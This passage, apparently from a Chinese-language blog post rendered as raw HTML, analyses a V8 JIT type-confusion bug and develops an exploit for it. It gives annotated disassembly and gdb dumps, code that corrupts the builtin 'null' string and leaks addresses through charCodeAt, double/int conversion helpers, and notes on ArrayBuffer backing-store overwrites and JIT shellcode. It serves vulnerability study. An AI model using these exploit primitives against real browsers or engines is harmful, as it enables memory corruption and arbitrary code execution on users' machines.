class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">--- Raw source ---</span><br><span class="line">() &#123;</span><br><span class="line">n.xyz = 0x826852f4;</span><br><span class="line">parseInt(&apos;AAAAAAAA&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--- Optimized code ---</span><br><span class="line">optimization_id = 1</span><br><span class="line">source_position = 50</span><br><span class="line">kind = OPTIMIZED_FUNCTION</span><br><span class="line">name = Check</span><br><span class="line">stack_slots = 5</span><br><span class="line">compiler = crankshaft</span><br><span class="line">Instructions (size = 186)</span><br><span class="line">0x35680eb86c80     0  55             push rbp</span><br><span class="line">0x35680eb86c81     1  4889e5         REX.W movq rbp,rsp</span><br><span class="line">0x35680eb86c84     4  56             push rsi</span><br><span class="line">0x35680eb86c85     5  57             push rdi</span><br><span class="line">0x35680eb86c86     6  4883ec08       REX.W subq rsp,0x8</span><br><span class="line">0x35680eb86c8a    10  488b45f8       REX.W movq rax,[rbp-0x8]</span><br><span class="line">0x35680eb86c8e    14  488945e8       REX.W movq [rbp-0x18],rax</span><br><span class="line">0x35680eb86c92    18  488bf0         REX.W movq rsi,rax</span><br><span class="line">0x35680eb86c95    21  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]</span><br><span class="line">0x35680eb86c9c    28  7305           jnc 35  (0x35680eb86ca3)</span><br><span class="line">0x35680eb86c9e    30  e83dbcf5ff     call StackCheck  (0x35680eae28e0)    ;; code: BUILTIN</span><br><span class="line">0x35680eb86ca3    35  48b8c1bd62be00370000 REX.W movq rax,0x3700be62bdc1    ;; object: 0x3700be62bdc1 PropertyCell for 0x18b675545e1 &lt;a Set with map 0xae15ff0c391&gt;</span><br><span class="line">...</span><br><span class="line">gdb-peda$ job $rax</span><br><span class="line">0x288d1c42b999: [PropertyCell]</span><br><span class="line"> - value: 0x28212078a219 &lt;a Set with map 0x1fdb7e106509&gt;</span><br><span class="line"> - details: (data, dictionary_index: 138, attrs: [WE_])</span><br><span class="line"> - cell_type: ConstantType (StableMap)</span><br><span class="line">...</span><br><span class="line">0x35680eb86cad    45  488b400f       REX.W movq rax,[rax+0xf] //取出JSSet n</span><br><span class="line">...</span><br><span class="line">gdb-peda$ job $rax</span><br><span class="line">0x28212078a219: [JSSet]</span><br><span class="line"> - map = 0x1fdb7e106509 [FastProperties]</span><br><span class="line"> - prototype = 0x288d1c415e49</span><br><span class="line"> - elements = 0x2089c5182241 &lt;FixedArray[0]&gt; [FAST_HOLEY_SMI_ELEMENTS] - table = 0x28212078a239 &lt;FixedArray[13]&gt;</span><br><span class="line"> - properties = &#123;</span><br><span class="line"> &#125;</span><br><span class="line">...</span><br><span class="line">0x35680eb86cb1    49  49ba0000805e0a4de041 REX.W movq r10,0x41e04d0a5e800000</span><br><span class="line">0x35680eb86cbb    59  c4c1f96ec2     vmovq xmm0,r10</span><br><span class="line">...</span><br><span class="line">0x41e04d0a5e800000 --d2ull-&gt; 0x00000000826852f4</span><br><span class="line">...</span><br><span class="line">0x35680eb86cc0    64  488b4007       REX.W movq rax,[rax+0x7] // 取n的自定义属性数组</span><br><span class="line">...</span><br><span class="line">0x0000393bb3086cc4 in ?? ()</span><br><span class="line">gdb-peda$ job $rax</span><br><span class="line">0x2089c5182241: [FixedArray]</span><br><span class="line"> - length: 0</span><br><span class="line">gdb-peda$ x/20gx 0x28212078a219-1</span><br><span class="line">0x28212078a218:0x00001fdb7e1065090x00002089c5182241</span><br><span class="line">0x28212078a228:0x00002089c5182241</span><br><span class="line">...</span><br><span class="line">0x35680eb86cc4    68  488b400f       REX.W movq rax,[rax+0xf] // 取n的xyz域</span><br><span class="line">// 因为当JSSet对象n进行初始化时，由于尚没有其他的自定义属性存在，因此该位置将使用内置对象empty_fixed_array进行初始化。</span><br><span class="line">// 让我们看一下empty_fixed_array</span><br><span class="line">0x2089c5182240:0x000007f3e4882309-&gt;FIXED_ARRAY_TYPE Map0x0000000000000000</span><br><span class="line">0x2089c5182250:0x000007f3e4882361-&gt;initial_string map0x00000000803b1506</span><br><span class="line">0x2089c5182260:0x00000004000000000xdeadbeed6c6c756e</span><br><span class="line">...</span><br><span class="line">gdb-peda$ job $rax</span><br><span class="line">0x7f3e4882361: [Map]</span><br><span class="line"> - type: ONE_BYTE_INTERNALIZED_STRING_TYPE</span><br><span class="line"> - instance size: 0</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x2089c5182311 &lt;undefined&gt;</span><br><span class="line"> - instance descriptors (own) #0: 0x2089c5182231 &lt;FixedArray[0]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x2089c5182201 &lt;null&gt;</span><br><span class="line"> - constructor: 0x2089c5182201 &lt;null&gt;</span><br><span class="line"> - code cache: 0x2089c5182241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x2089c5182241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line">...</span><br><span class="line">0x35680eb86cc8    72  c5fb114007     vmovsd [rax+0x7],xmm0 //重新赋值，破坏了initial_string map的结构，于是在后面ParseInt字符串的时候会crash</span><br><span class="line">...</span><br><span class="line">对比一下赋值前后</span><br><span class="line">前:</span><br><span class="line">gdb-peda$ x/20gx 0x7f3e4882361-1</span><br><span class="line">0x7f3e4882360:0x000007f3e48822590x0019000400007300</span><br><span class="line">0x7f3e4882370:0x00000000082003ff0x00002089c5182201</span><br><span class="line">后:</span><br><span class="line">gdb-peda$ x/20gx 0x7f3e4882361-1</span><br><span class="line">0x7f3e4882360:0x000007f3e48822590x41e04d0a5e800000--&gt;破坏了map结构</span><br><span class="line">0x7f3e4882370:0x00000000082003ff0x00002089c5182201</span><br><span class="line">...</span><br><span class="line">0x35680eb86ccd    77  49ba112330abf6000000 REX.W movq r10,0xf6ab302311    ;; object: 0xf6ab302311 &lt;undefined&gt;</span><br><span class="line">0x35680eb86cd7    87  4152           push r10</span><br><span class="line">0x35680eb86cd9    89  49ba39b062be00370000 REX.W movq r10,0x3700be62b039    ;; object: 0x3700be62b039 &lt;String[8]: AAAAAAAA&gt;</span><br><span class="line">0x35680eb86ce3    99  4152           push r10</span><br><span class="line">0x35680eb86ce5   101  48bf51d860be00370000 REX.W movq rdi,0x3700be60d851    ;; object: 0x3700be60d851 &lt;JS Function parseInt (SharedFunctionInfo 0xf6ab33ce11)&gt;</span><br><span class="line">0x35680eb86cef   111  488b75e8       REX.W movq rsi,[rbp-0x18]</span><br><span class="line">0x35680eb86cf3   115  488b7727       REX.W movq rsi,[rdi+0x27]</span><br><span class="line">0x35680eb86cf7   119  498b55a0       REX.W movq rdx,[r13-0x60]</span><br><span class="line">0x35680eb86cfb   123  b801000000     movl rax,0x1</span><br><span class="line">0x35680eb86d00   128  bb02000000     movl rbx,0x2</span><br><span class="line">0x35680eb86d05   133  e8f6eeefff     call ArgumentsAdaptorTrampoline  (0x35680ea85c00)    ;; code: BUILTIN</span><br><span class="line">0x35680eb86d0a   138  48b8112330abf6000000 REX.W movq rax,0xf6ab302311    ;; object: 0xf6ab302311 &lt;undefined&gt;</span><br><span class="line">0x35680eb86d14   148  488be5         REX.W movq rsp,rbp</span><br><span class="line">0x35680eb86d17   151  5d             pop rbp</span><br><span class="line">0x35680eb86d18   152  c20800         ret 0x8</span><br><span class="line">0x35680eb86d1b   155  90             nop</span><br></pre></td></tr></table></figure><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>据此，我们可以得出结论，在JIT优化之后，会直接从n中取出直接取出自定义属性数组中，对应于某属性偏移的字段，而不做任何合法性校验。</p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    n.xyz = <span class="number">3.4766863919133141e-308</span>;    <span class="comment">// do not modify string map </span></span><br><span class="line">    n.xyz1 = <span class="number">0x1821923f</span>                 <span class="comment">// do not modify hash value</span></span><br><span class="line">    n.xyz2 = <span class="number">0x7000</span>         <span class="comment">// enlarge length of builtIn string 'null'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">0x1c4269306d80     0  55             push rbp</span><br><span class="line">0x1c4269306d81     1  4889e5         REX.W movq rbp,rsp</span><br><span class="line">0x1c4269306d84     4  56             push rsi</span><br><span class="line">0x1c4269306d85     5  57             push rdi</span><br><span class="line">0x1c4269306d86     6  4883ec08       REX.W subq rsp,0x8</span><br><span class="line">0x1c4269306d8a    10  488b45f8       REX.W movq rax,[rbp-0x8]</span><br><span class="line">0x1c4269306d8e    14  488945e8       REX.W movq [rbp-0x18],rax</span><br><span class="line">0x1c4269306d92    18  488bf0         REX.W movq rsi,rax</span><br><span class="line">0x1c4269306d95    21  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]</span><br><span class="line">0x1c4269306d9c    28  7305           jnc 35  (0x1c4269306da3)</span><br><span class="line">0x1c4269306d9e    30  e83dbbf5ff     call StackCheck  (0x1c42692628e0)    ;; code: BUILTIN</span><br><span class="line">0x1c4269306da3    35  48b8d9b9fadec60a0000 REX.W movq rax,0xac6defab9d9    ;; object: 0xac6defab9d9 PropertyCell for 0x3b0974d0a4b9 &lt;a Set with map 0x30613ee86509&gt;</span><br><span class="line">0x1c4269306dad    45  488b400f       REX.W movq rax,[rax+0xf] //取出JSSet n</span><br><span class="line">0x1c4269306db1    49  49ba0064000004001900 REX.W movq r10,0x19000400006400</span><br><span class="line">0x1c4269306dbb    59  c4c1f96ec2     vmovq xmm0,r10</span><br><span class="line">0x1c4269306dc0    64  488b5807       REX.W movq rbx,[rax+0x7] // 取n的自定义属性数组</span><br><span class="line">0x1c4269306dc4    68  488b5b0f       REX.W movq rbx,[rbx+0xf] // 取n的xyz域，注意取域的时候，如果这个域代表的意义是一个整数值，就直接写入，如果代表的是一个指针，就要从指针再寻址写入。</span><br><span class="line">0x1c4269306dc8    72  c5fb114307     vmovsd [rbx+0x7],xmm0</span><br><span class="line">0x1c4269306dcd    77  488b5807       REX.W movq rbx,[rax+0x7] // 取n的自定义属性数组</span><br><span class="line">0x1c4269306dd1    81  c7431b3f922118 movl [rbx+0x1b],0x1821923f // 取n的xyz1域，注意这里要用一个整形数去完整替换，不然会变成一个HeapNum指针，而这个指针是可能访问到不能访问的内存，从而crash</span><br><span class="line">0x1c4269306dd8    88  488b4007       REX.W movq rax,[rax+0x7] // 取n的自定义属性数组</span><br><span class="line">0x1c4269306ddc    92  c7402300700000 movl [rax+0x23],0x7000 // 取n的xyz1域</span><br><span class="line">...</span><br><span class="line">最终</span><br><span class="line">gdb-peda$ x/20gx $rax-1</span><br><span class="line">0x3067ec802240:0x000025b0e35823090x0000000000000000</span><br><span class="line">0x3067ec802250:0x000025b0e3582361-&gt;xyz0x1821923f-&gt;xyz1  803b1506</span><br><span class="line">0x3067ec802260:0x00007000-&gt;xyz2 000000000xdeadbeed6c6c756e</span><br><span class="line">...</span><br><span class="line">0x1c4269306de3    99  48b8112380ec67300000 REX.W movq rax,0x3067ec802311    ;; object: 0x3067ec802311 &lt;undefined&gt;</span><br><span class="line">0x1c4269306ded   109  488be5         REX.W movq rsp,rbp</span><br><span class="line">0x1c4269306df0   112  5d             pop rbp</span><br><span class="line">0x1c4269306df1   113  c20800         ret 0x8</span><br></pre></td></tr></table></figure><h3 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x2b753502250:0x00003182a4182361-&gt;null0x00000000803b1506</span><br><span class="line">0x2b753502260:0x00000004-&gt;length 000000000xdeadbeed 6c6c756e-&gt;&quot;null&quot;</span><br><span class="line">0x2b753502270:0x00003182a4182361-&gt;object0x00000000c5f6c42a</span><br><span class="line">0x2b753502280:0x0000000600000000-&gt;length0xdead 7463656a626f-&gt;&quot;object&quot;</span><br><span class="line">...</span><br><span class="line">gdb-peda$ job 0x2b753502251</span><br><span class="line">#null</span><br><span class="line">gdb-peda$ job 0x2b753502271</span><br><span class="line">#object</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-10-12-092410.jpg" alt=""></p><h3 id="JSFunction"><a href="#JSFunction" class="headerlink" title="JSFunction"></a>JSFunction</h3><ul><li><p>表示JavaScript function的对象</p><ul><li>继承Object, HeapObject, JSReceiver, JSObject<ul><li>内存结构如下（在64位环境的情况下）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-141352.png" alt=""></li></ul></li></ul></li><li><p>实际演示</p><ul><li>存放function f()在数组中</li><li>用0xdeadbee查找这个数组的内存位置<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-142310.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-142325.png" alt=""></li><li><p>kCodeEntryOffset is a pointer to the JIT code (RWX area), many strategies to realize arbitrary code execution by writing shellcode before this</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-142516.png" alt=""></p></li></ul></li></ul><h3 id="JSArrayBuffer"><a href="#JSArrayBuffer" class="headerlink" title="JSArrayBuffer"></a>JSArrayBuffer</h3><h4 id="ArrayBuffer-and-TypedArray"><a href="#ArrayBuffer-and-TypedArray" class="headerlink" title="ArrayBuffer and TypedArray"></a>ArrayBuffer and TypedArray</h4><ul><li>Originally ArrayBuffer<ul><li>一个可以直接从JavaScript访问内存的特殊数组<ul><li>但是，ArrayBuffer仅准备一个内存缓冲区</li><li>BackingStore——可以使用TypedArray指定的类型读取和写入该区域，例如作为原始数据数组访问的8位或32位内存<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-151055.png" alt=""></li><li>为了实际访问，有必要一起使用TypedArray或DataView<br>  <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-151829.png" alt=""></li></ul></li><li>使用例子 (TypedArray版本)<ul><li>创建方法1，仅指定长度，初始化为零<br>t_arr = new Uint8Array(128) //ArrayBuffer被创建在内部</li><li>创建方法2，使用特定值初始化<br>t_arr = new Uint8Array([4,3,2,1,0]) //ArrayBuffer被创建在内部</li><li>创建方法3，事先构建缓冲区并使用它<br>arr_buf = new ArrayBuffer(8);<br>t_arr1 = new Uint16Array(arr_buf); //创建一个Uint16数组<br>t_arr2 = new Uint16Array(arr_buf, 0, 4); //或者，您也可以指定数组的开始和结束位置</li></ul></li><li>ArrayBuffer可以在不同的TypedArray之间共享<ul><li>它也可以用于double和int的类型转换<ul><li><strong>类型转换的意义在于改变字节序列的解释，而不是转换</strong></li><li>就像C语言的Union</li></ul></li><li>BackingStore——可以使用TypedArray指定的类型读取和写入该区域，例如作为原始数据数组访问的8位或32位内存<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-153219.png" alt=""></li><li>①预先准备ArrayBuffer<br>var ab = new ArrayBuffer(0x100);</li><li>②向ArrayBuffer中写入一个Float64的值<br>var t64 = new Float64Array(ab);<br>t64[0] = 6.953328187651540e-310;//字节序列是0x00007fffdeadbeef<br><strong>–&gt;当某些地址在V8上泄露时，通常在大多数情况下被迫将其解释为双精度值，为了正确计算偏移量等，需要将其转换为整数值。 对于完成该转换，ArrayBuffer是最佳的</strong></li><li>③从ArrayBuffer读取两个Uint32<br>var t32 = new Uint32Array(ab);<br>k = [t32[1],t32[0]]<br><strong>–&gt;k是6.953328187651540e-310,将字节序列按照4个字节去分开，然后解释为Uint32,于是得到:</strong><br><strong>k=[0x00007fff，0xdeadbeef]</strong></li></ul></li></ul></li></ul><h4 id="JSArrayBuffer-1"><a href="#JSArrayBuffer-1" class="headerlink" title="JSArrayBuffer"></a>JSArrayBuffer</h4><ul><li>持有ArrayBuffer的对象<ul><li>继承Object，HeapObject，JSReceiver，JSObject<ul><li>内存结构如下（在64位环境的情况下）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-155703.png" alt=""></li></ul></li></ul></li><li>实际演示<ul><li>存放TypedArray</li><li>使用长度0x13370搜索ArrayBuffer的内存位置<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-160126.png" alt=""></li><li>在V8中，对象通常被存放在由GC管理的mapped区域，然而BackingStore是一个不被GC管理的区域，并且被存放在heap中(在图中，可以看到malloc块有prev_size和size成员）<br>此外，由于它不是由GC管理的HeapObject，因此指向BackingStore的指针不是Tagged Value（末尾不能为1）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-160917.png" alt=""></li><li>虽然在ArrayBuffer中描述了大小，但如果将此值重写为较大的值，则可以允许读取和写入的长度，超出BackingStore数组的范围。</li><li>同样，如果您可以重写BackingStore指针，则可以读取和写入任意内存地址，这些是在exploit中常用的方法。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-162614.png" alt=""><h3 id="工具类准备"><a href="#工具类准备" class="headerlink" title="工具类准备"></a>工具类准备</h3>主要是用于double和int值的转换<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// int-&gt;double</span></span><br><span class="line"><span class="comment">// d2u(intaddr/0x100000000,intaddr&amp;0xffffffff)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">d2u</span>(<span class="params">num1,num2</span>)</span>&#123;</span><br><span class="line">    d = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">2</span>);</span><br><span class="line">    d[<span class="number">0</span>] = num2;</span><br><span class="line">    d[<span class="number">1</span>] = num1;</span><br><span class="line">    f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(d.buffer);</span><br><span class="line">    <span class="keyword">return</span> f[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// double-&gt;int</span></span><br><span class="line"><span class="comment">// u2d(floataddr)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">u2d</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">    f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="number">1</span>);</span><br><span class="line">    f[<span class="number">0</span>] = num;</span><br><span class="line">    d = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(f.buffer);</span><br><span class="line">    <span class="keyword">return</span> d[<span class="number">1</span>] * <span class="number">0x100000000</span> + d[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="leak-ArrayBuffer和Function"><a href="#leak-ArrayBuffer和Function" class="headerlink" title="leak ArrayBuffer和Function"></a>leak ArrayBuffer和Function</h3><ol><li>触发漏洞，越界写null string的长度，写null string的value字段为obj</li><li>charCodeAt读出null string的value内容，从而leak出来<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">var</span> n;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">n = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    n.xyz = <span class="number">3.4766863919152113e-308</span>; <span class="comment">// do not modify string map</span></span><br><span class="line">    n.xyz1 = <span class="number">0x0</span>; <span class="comment">// do not modify the value</span></span><br><span class="line">    n.xyz2 = <span class="number">0x7000</span>; <span class="comment">// enlarge length of builtIn string 'null'</span></span><br><span class="line">    n.xyz3 = obj; <span class="comment">// leak the Object </span></span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">Ctor(); <span class="comment">// 初始化n</span></span><br><span class="line">Check(ab); <span class="comment">//写入ArrayBuffer到value字段</span></span><br><span class="line"><span class="comment">// gdb-peda$ x/10gx 0x28767ae02240</span></span><br><span class="line"><span class="comment">// 0x28767ae02240:0x00000834750823090x0000000000000000</span></span><br><span class="line"><span class="comment">// 0x28767ae02250:0x00000834750823610x00000000803b1506</span></span><br><span class="line"><span class="comment">// 0x28767ae02260:0x00007000000000000x000004ea79906839-&gt;ArrayBuffer</span></span><br><span class="line"><span class="comment">// 0x28767ae02270:0x00000834750823610x00000000c5f6c42a</span></span><br><span class="line"><span class="comment">// 0x28767ae02280:0x00000006000000000xdead7463656a626f</span></span><br><span class="line"><span class="comment">// gdb-peda$ job 0x000004ea79906839</span></span><br><span class="line"><span class="comment">// 0x4ea79906839: [JSArrayBuffer]</span></span><br><span class="line"><span class="comment">//  - map = 0x3bcf5fc82db1 [FastProperties]</span></span><br><span class="line"><span class="comment">//  - prototype = 0xb3e9b805599</span></span><br><span class="line"><span class="comment">//  - elements = 0x28767ae02241 &lt;FixedArray[0]&gt; [FAST_HOLEY_SMI_ELEMENTS]</span></span><br><span class="line"><span class="comment">//  - internal fields: 2</span></span><br><span class="line"><span class="comment">//  - backing_store = 0x55ba589d0640</span></span><br><span class="line"><span class="comment">//  - byte_length = 512</span></span><br><span class="line"><span class="comment">//  - properties = &#123;</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">//  - internal fields = &#123;</span></span><br><span class="line"><span class="comment">//     0</span></span><br><span class="line"><span class="comment">//     0</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">var</span> ab_addr = str.charCodeAt(<span class="number">0</span>)*<span class="number">0x1</span>+str.charCodeAt(<span class="number">1</span>)*<span class="number">0x100</span>+str.charCodeAt(<span class="number">2</span>)*<span class="number">0x10000</span>+str.charCodeAt(<span class="number">3</span>)*<span class="number">0x1000000</span>+str.charCodeAt(<span class="number">4</span>)*<span class="number">0x100000000</span>+str.charCodeAt(<span class="number">5</span>)*<span class="number">0x10000000000</span>+str.charCodeAt(<span class="number">6</span>)*<span class="number">0x1000000000000</span>+str.charCodeAt(<span class="number">7</span>)*<span class="number">0x100000000000000</span>;</span><br><span class="line">print(<span class="string">"0x"</span>+ab_addr.toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure></li></ol><p>同理，leak出function</p><h3 id="写null-string的地址到它自己的value，从而可以通过写value来再次修改null-string"><a href="#写null-string的地址到它自己的value，从而可以通过写value来再次修改null-string" class="headerlink" title="写null string的地址到它自己的value，从而可以通过写value来再次修改null string"></a>写null string的地址到它自己的value，从而可以通过写value来再次修改null string</h3><p><strong>这里为什么要这么做呢，原因其实在test里已经可以看到的，如果我们写一个smi到一个属性字段，当然可以直接写到该属性字段对应的偏移。</strong><br>也就是如图xyz1，我直接写入了一个0x1821923f的smi，注意smi最大是多少呢，在64位和32位有所不同。<br>在64位平台上V8对smi定义的范围是[-2³¹，2³¹-1]，即最大0x7fffffff，显然一个对象的地址会大于它，从而无法直接去写一个地址到该属性字段对应的偏移。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/20gx $rax-1</span><br><span class="line">0x3067ec802240:0x000025b0e35823090x0000000000000000</span><br><span class="line">0x3067ec802250:0x000025b0e3582361-&gt;xyz0x1821923f-&gt;xyz1  803b1506</span><br><span class="line">0x3067ec802260:0x00007000-&gt;xyz2 000000000xdeadbeed6c6c756e</span><br></pre></td></tr></table></figure></p><p><strong>所以我们要写null string的地址到它自己的value，从而可以通过写value来再次修改null string。</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Check(<span class="built_in">String</span>(<span class="literal">null</span>));</span><br><span class="line"><span class="comment">// gdb-peda$ x/20gx $rbx-1</span></span><br><span class="line"><span class="comment">// 0x3817fa502240:0x00003bd6a43823090x0000000000000000</span></span><br><span class="line"><span class="comment">// 0x3817fa502250:0x00003bd6a43823610x00000000803b1506</span></span><br><span class="line"><span class="comment">// 0x3817fa502260:0x00007000000000000x00003817fa502251-&gt;null string</span></span><br><span class="line"><span class="comment">// gdb-peda$ job 0x00003bd6a4382361</span></span><br><span class="line"><span class="comment">// 0x3bd6a4382361: [Map]</span></span><br><span 